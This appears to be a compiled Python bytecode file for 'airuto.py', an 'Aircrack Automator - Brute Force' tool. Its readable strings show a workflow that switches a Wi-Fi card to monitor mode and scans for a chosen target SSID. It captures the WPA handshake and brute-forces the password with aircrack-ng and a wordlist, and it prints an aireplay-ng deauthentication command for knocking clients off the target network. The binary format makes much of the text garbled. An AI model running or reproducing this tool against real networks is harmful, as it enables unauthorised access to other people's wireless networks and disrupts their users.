o
    �Sd
  �                   @   s�  d dl Z d dlZd dlZd dlZd dlmZ d dlmZ dZdZdZdZ	dZ
d	Zze �d
� e �d� W n   Y e jdkrLe �d� ed�ee�� nje �d� ed�e�� ed� ed� ed� ed� ed� ed�eee�� ejddejd�Zej�d�Zdevr�e �d� ed�ee�� ed�e	e�� ed�e	eee�� ed�e	eee�� e�  n	 	 �zWejd dejd�Zej�d��d!�Ze�d"� d#ZeZeeed$d d%�\ZZed&�e	eee�� ejd'�e�dd(� e d)�ee��Z!e"e d*�ee���pd+�Ze d,�ee��Z#e j$�%e#�d-k�r$ed.�ee�� e�  n	 ed/k�r6ed0�ee�� e�  n	ed1�e	ee�� ejd2�ee�dd(� ejd3e! dejd�Z&e&j�d��'d4d"��'d5d6��d!�dd7� Z(e)e(�d8k�r�d9�*e(�Z+e+�d9�Z,d:�ee�Z-e,Z.ee.e-d$d d%�\Z.Z/e.�d6�Z(n
d5�*e(�Z0e0�d6�Z(e(d; Z1e(d  Z2e(d8 Z3eee2e3e1ggg d<�d=d>�� ed?�eeee�� ed@�e	e�� eedAdBe dC ggdDdEgd=d>�� ejdF�e3e2e�dd(�Z4e �dG� e �dH� ej5dI�e#�dejej6dJ�Z7edK�ee�� e �dL� W dS  e8�y,   e �dH� e �dL� edM�ee�� Y dS  e9�y>   edN�ee�� Y dS    edO�ee�� e �dL� Y dS )P�    N)�tabulate)�pickz[31mz[32mz[33mz[36mz[35mz[0mz(rm deletethisfile-* && rm -rf resultPcap�
resultPcap�nt�clsz([ {}ERROR{} ] Cannot Support for Windows�clearz{}   _   _            _        z  / \ (_)_ __ _   _| |_ ___  z /   \| | '__| | | | __/ _ \ z/  _  \ | |  | |_| | || (_) |z\_/ \_/_|_|   \__,_|\__\___/ z Aircrack Automator - Brute Forcez{}by {}Sterben404{}
znmcli deviceT)�shell�stdoutzutf-8�wifiz#
[ {}ERROR{} ] Missing Wifi Adapterz*[ {}INFO{} ] Make sure monitoring mode offzB[ {}INFO{} ] command with airmon : {}airmon-ng stop (INTERFACES){}z>[ {}INFO{} ] example command     :{} airmon-ng stop wlan0mon{}z,nmcli device | grep wifi\ | awk '{print $1}'�
� zChoose Network Identity Card : z=>)�	indicator�default_indexz,[ {}INFO{} ] Switch Monitor Mode {} to {}monzBxterm -fa "Noto Mono" -fs 9 -geometry 120x20 -e airmon-ng start {})r   z[   {}?{}  ] Target SSID : z4[   {}?{}  ] Time to Scanning SSID (default: 10s) : �10z[   {}?{}  ] Wordlist : Fz[ {}ERROR{} ] File not found�<   z"[ {}ERROR{} ] Time to long max 60sz$[ {}INFO{} ] Wait for {} Seconds...
z�xterm -fa "Noto Mono" -fs 9 -geometry 95x30 -T "Scanning Wlan" -n "Scanning Wlan" -e timeout {}s airodump-ng -w deletethisfile --output-format csv {}monz?cat deletethisfile-01.csv | grep '\<%s\>' | cut -d ',' -f1,4,14� �,z   ������   �|z1[ {}Found Duplicate SSID{} ]
Please Choose One : �   )�BSSID�CHANNEL�SSID�
fancy_grid)�headers�tablefmtzN
[ {}NOTE{} ] {}Close window manual if EAPOL/PMKID captured in column Notes{}
z2[ {}INFO{} ] Please use command bellow for Deauth
�Deauthu4   aireplay-ng –0 10 –a ((BSSID)) –c ((Station)) �mon�Name�Commandz�xterm -fa "Noto Mono" -fs 9 -geometry 95x30 -T "Monitoring" -n "Monitoring" -e airodump-ng -c {} --bssid {} -w resultPcap/result {}monz&cp resultPcap/result-01.cap result.capz-rm deletethisfile-01.csv && rm -rf resultPcapzaircrack-ng result.cap -w {})r   r	   �stderrz[ {}OK{} ] Finishedzairmon-ng stop wlan0monzA[ {}ERROR{} ] SSID does not exist or Time for scanning is to fastz%[ {}ERROR{} ] Enter the correct valuez[ {}ERROR{} ] Quit Program):�os�sys�time�
subprocessr   r   �red�green�yellow�blue�purple�reset�system�mkdir�name�print�format�run�PIPE�checkErrorNICr	   �decode�errorNIC�exit�checkNic�split�	resultNic�remove�titleNic�optNic�indexNic�call�input�target�int�wlist�path�isfile�	getDetail�replace�resultGetDetail�len�join�mergeResultMultiple�splitResultMultiple�	titleSSID�optSSID�index�mergeSingle�ssid�bssid�channel�deauth�
check_call�STDOUT�crack�
IndexError�
ValueError� rY   rY   �	airuto.py�<module>   s�    






*



$



